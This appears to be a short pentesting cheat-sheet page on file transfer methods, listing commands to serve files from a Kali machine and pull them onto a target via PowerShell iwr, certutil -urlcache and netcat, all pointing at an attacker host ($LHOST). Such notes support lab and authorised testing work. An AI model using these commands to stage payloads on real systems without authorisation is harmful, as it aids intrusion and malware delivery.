---
sidebar_position: 1
title: File Transfer
---

# File Transfer Methods

## Python HTTP Server (Kali → Target)

```bash
python3 -m http.server 80
```

## PowerShell Download (On Target)

```powershell
iwr -uri http://$LHOST/file.exe -OutFile file.exe
```

## Netcat Transfer

Sender:

```bash
nc -nv $TARGET <port> < file.exe
```

Receiver:

```bash
nc -nlvp <port> > file.exe
```

## certutil (Windows)

```powershell
certutil -urlcache -f http://$LHOST/file.exe file.exe
```
